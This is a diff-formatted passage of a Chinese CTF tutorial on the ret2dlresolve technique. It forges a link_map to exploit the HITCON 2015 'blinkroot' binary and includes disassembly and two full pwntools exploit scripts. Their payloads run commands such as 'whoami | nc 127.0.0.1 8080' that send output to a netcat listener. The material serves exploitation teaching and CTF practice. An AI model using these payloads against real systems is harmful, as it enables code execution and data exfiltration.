@@ -1,0 +1,233 @@
+    close(0);
+    close(1);
+    close(2);
+    *(__m128 *)((char *)&data + data) = _mm_loadh_ps(&dbl_600BC8);
+    puts(s);
+  }
+  _exit(0);
+}
+```
+程序会执行 puts 函数，而 puts 函数的具体地址为 data 变量偏移 0x10。
+```
+.bss:0000000000600BC0                 public data
+.bss:0000000000600BC0 data            dq ?                    ; DATA XREF: main+B↑o
+.bss:0000000000600BC0                                         ; main+4D↑r ...
+.bss:0000000000600BC8 ; double dbl_600BC8
+.bss:0000000000600BC8 dbl_600BC8      dq ?                    ; DATA XREF: main+5C↑o
+.bss:0000000000600BD0 ; char s[1008]
+.bss:0000000000600BD0 s               db 3F0h dup(?)          ; DATA XREF: main+72↑o
+.bss:0000000000600BD0 _bss            ends
+```
+因此，我们可以控制 s 为 /bin/sh，同时控制字符串表中的 puts 函数为 system 函数，那就可以调用 system 函数了。然而，理想很好，但是，我们发现
+```
+LOAD:00000000006009E8                 Elf64_Dyn   ; DT_STRTAB
+LOAD:00000000006009F8                 Elf64_Dyn   ; DT_SYMTAB
+LOAD:0000000000600A08                 Elf64_Dyn     ; DT_STRSZ
+```
+字符串表并不是 16 字节对齐的，因此不太行。那我们尝试使用在开启 Partial RELRO 下的思路吧。
+由于不能泄露地址信息，所以我们可以采用伪造 linkmap 的思路，即
+- 利用题目提供的任意写的思路修改 linkmap 指向已经解析的地址
+- 通过题目中接下来将要调用的 puts 函数来实现劫持控制流的目的
+这里我们可以发现 linkmap 存储的地址为 0x600B48，因此我们可以从 0x600B40 开始设置数据。
+```assembly
+.got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
+.got.plt:0000000000600B48 qword_600B48    dq 0                    ; DATA XREF: sub_4004D0↑r
+```
+此外，需要注意的是 puts 函数在重定位表中的索引为 1。因此，在构造 linkmap 时需要注意。
+```assembly
+.plt:00000000004004F0 ; int puts(const char *s)
+.plt:00000000004004F0 _puts           proc near               ; CODE XREF: main+77↓p
+.plt:00000000004004F0                 jmp     cs:off_600B60
+.plt:00000000004004F0 _puts           endp
+.plt:00000000004004F0
+.plt:00000000004004F6 ; ---------------------------------------------------------------------------
+.plt:00000000004004F6                 push    1
+.plt:00000000004004FB                 jmp     sub_4004D0
+```
+利用脚本如下
+```python
+from pwn import *
+context.terminal=["tmux","splitw","-h"]
+io = process("blinkroot")
+elf = ELF("blinkroot")
+libc = ELF("./libc.so.6")
+def ret2dlresolve_with_fakelinkmap_x64(elf, fake_linkmap_addr, known_function_ptr, offset_of_two_addr):
+    '''
+    elf: is the ELF object
+    fake_linkmap_addr: the address of the fake linkmap
+    known_function_ptr: a already known pointer of the function, e.g., elf.got['__libc_start_main']
+    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
+                        target_function_addr is the function you want to execute
+    WARNING: assert *(known_function_ptr-8) & 0x0000030000000000 != 0 as ELF64_ST_VISIBILITY(o) = o & 0x3
+    WARNING: be careful that fake_linkmap is 0x100 bytes length   
+    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1
+    linkmap:
+        0x00: l_addr = offset_of_two_addr
+      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x8
+        0x08: 17, tag of the JMPREL
+        0x10: fake_linkmap_addr + 0x18, pointer of the fake JMPREL
+      fake_JMPREL, addr = fake_linkmap_addr + 0x18
+        0x18: padding for the relocation entry of idx=0
+        0x20: padding for the relocation entry of idx=0
+        0x28: padding for the relocation entry of idx=0
+        0x30: p_r_offset, offset pointer to the resloved addr
+        0x38: r_info
+        0x40: append    
+      resolved addr
+        0x48: r_offset
+      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0x50
+        0x50: 6, tag of the DT_SYMTAB
+        0x58: known_function_ptr-8, p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
+      P_DT_STRTAB, pointer for DT_STRTAB
+        0x68: fake a pointer, e.g., fake_linkmap_addr
+      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
+        0x70: fake_linkmap_addr + 0x50
+      p_DT_JMPREL, pointer for fake_DT_JMPREL
+        0xf8: fake_linkmap_addr + 0x8
+    '''
+    plt0 = elf.get_section_by_name('.plt').header.sh_addr
+    linkmap = p64(offset_of_two_addr & (2**64 - 1))
+    linkmap += p64(17) + p64(fake_linkmap_addr + 0x18)
+    linkmap += p64(0)*3
+    # here we set p_r_offset = fake_linkmap_addr + 0x48 - two_offset
+    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = offset_of_two_addr
+    linkmap += p64((fake_linkmap_addr + 0x48 - offset_of_two_addr)
+                   & (2**64 - 1)) + p64(0x7) + p64(0)
+    linkmap += p64(0)
+    linkmap += p64(6) + p64(known_function_ptr-8)
+    linkmap = linkmap.ljust(0x68, 'A')
+    linkmap += p64(fake_linkmap_addr)
+    linkmap += p64(fake_linkmap_addr + 0x50)
+    linkmap = linkmap.ljust(0xf8, 'A')
+    linkmap += p64(fake_linkmap_addr + 8)
+    return linkmap
+# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
+# .got.plt:0000000000600B48 qword_600B48    dq 0    
+target_addr = 0x600B40
+data_addr = 0x600BC0
+offset = target_addr-data_addr
+payload = p64(offset & (2**64 - 1))
+payload += p64(data_addr+43)
+payload += "whoami | nc 127.0.0.1 8080\x00"
+payload +=ret2dlresolve_with_fakelinkmap_x64(elf,data_addr+len(payload), elf.got["__libc_start_main"],libc.sym["system"]-libc.sym["__libc_start_main"])
+payload = payload.ljust(1024,'A')
+# gdb.attach(io)
+io.send(payload)
+io.interactive()
+```
+需要注意这里的 `data_addr+43` 为伪造的 linkmap 的地址。执行效果如下
+```
+❯ nc -l 127.0.0.1 8080
+iromise
+```
+上面的这种方式为伪造 link_map 的 l_addr 为目标函数和已解析函数之间的偏移。
+根据之前的介绍，我们还可以伪造 l_addr 为已解析函数的地址， st_value 为已解析函数和目标函数之间的偏移。
+```
+value = l->l_addr + sym->st_value
+```
+这里，由于 `.got.plt` 的下方没多远就是 bss 段 data 的位置。当我们控制 linkmap 的地址位于 got 表附近时，同时我们还需要利用 link_map 的几个动态表指针，偏移从 0x68 开始。因此我们需要仔细构造对应的数据。这里我们选择伪造 link_map 到 0x600B80。
+```
+0x600B80-->link_map
+0x600BC0-->data    
+0x600BC8-->data+8
+0x600BD0-->data+16, args of puts
+0x600BE8-->data+24
+```
+因此，我们可以控制的 puts 的参数的长度最大为 0x18。
+```python
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+io = process("blinkroot")
+elf = ELF("blinkroot")
+libc = ELF("./libc.so.6")
+def ret2dlresolve_with_fakelinkmap_x64(libc, fake_linkmap_addr, offset_of_two_addr):
+    '''
+    libc: is the ELF object
+    fake_linkmap_addr: the address of the fake linkmap
+    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
+                        target_function_addr is the function you want to execute
+    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1
+    linkmap:
+      P_DT_STRTAB, pointer for DT_STRTAB
+        0x68: fake a pointer, e.g., fake_linkmap_addr
+      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
+        0x70: fake_linkmap_addr + 0xc0
+      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78
+        0x78: 17, tag of the JMPREL
+        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL
+      fake_JMPREL, addr = fake_linkmap_addr + 0x88
+        0x88: padding for the relocation entry of idx=0
+        0x90: padding for the relocation entry of idx=0
+        0x98: padding for the relocation entry of idx=0
+        0xa0: p_r_offset, offset pointer to the resloved addr
+        0xa8: r_info
+        0xb0: append
+      resolved addr
+        0xb8: r_offset
+      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0
+        0xc0: 6, tag of the DT_SYMTAB
+        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
+      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0
+        0xd0: 0x0000030000000000
+        0xd8: offset_of_two_addr
+        0xe0: fake st_size
+      p_DT_JMPREL, pointer for fake_DT_JMPREL
+        0xf8: fake_linkmap_addr + 0x78
+    '''
+    linkmap = p64(fake_linkmap_addr)
+    linkmap += p64(fake_linkmap_addr+0xc0)
+    linkmap += p64(17) + p64(fake_linkmap_addr + 0x88)
+    linkmap += p64(0)*3
+    # here we set p_r_offset = libc.sym["__free_hook"]-libc.sym["__libc_start_main"]
+    # as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = __libc_start_main_addr
+    linkmap += p64((libc.sym["__free_hook"]-libc.sym["__libc_start_main"]) & (2**64 - 1)) + p64(0x7) + p64(0)
+    linkmap += p64(0)
+    linkmap += p64(6) + p64(fake_linkmap_addr + 0xd0)
+    linkmap += p64(0x0000030000000000) + \
+        p64(offset_of_two_addr & (2**64 - 1))+p64(0)
+    linkmap = linkmap.ljust(0xf8-0x68, 'A')
+    linkmap += p64(fake_linkmap_addr + 0x78)
+    return linkmap
+# .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC
+# .got.plt:0000000000600B48 qword_600B48    dq 0
+target_addr = 0x600B40
+data_addr = 0x600BC0
+offset = target_addr-data_addr
+payload = p64(offset & (2**64 - 1))
+payload += p64(elf.got["__libc_start_main"])
+payload += "id|nc 127.0.0.1 8080\x00".ljust(0x18,'a')
+payload += ret2dlresolve_with_fakelinkmap_x64(libc, elf.got["__libc_start_main"], libc.sym["system"]-libc.sym["__libc_start_main"])
+payload = payload.ljust(1024, 'A')
+# gdb.attach(io)
+io.send(payload)
+io.interactive()
+```
+需要注意的是，在伪造 linkmap  的时候，我们是从偏移 0x68 开始构造的，所以在最后对齐的时候设置 `linkmap.ljust(0xf8-0x68, 'A')`。
+执行效果
+```shell
+❯ nc -l 127.0.0.1 8080
+uid=1000(iromise) gid=1000(iromise)...
+```
+## 总结
+|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |
+| ------------ | --------------------- | ------------------------------------------------------------ | ---------------------------------------------------- |
+| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |
+| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |
+| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |
+总的来说，与 ret2dlresolve 攻击最为相关的一些动态节为
+- DT_JMPREL
+- DT_SYMTAB
+- DT_STRTAB
+- DT_VERSYM
+## 题目
+- pwnable.kr unexploitable
+- pwnable.tw unexploitable
+- 0CTF 2018 babystack
+- 0CTF 2018 blackhole
+## 参考
+1. http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ ，深入浅出。
+2. https://www.math1as.com/index.php/archives/341/
+3. https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
+4. https://blog.csdn.net/seaaseesa/article/details/104478081
+5. https://github.com/pwning/public-writeup/blob/master/hitcon2015/pwn300-readable/writeup.md
+6. https://github.com/pwning/public-writeup/tree/master/hitcon2015/pwn200-blinkroot
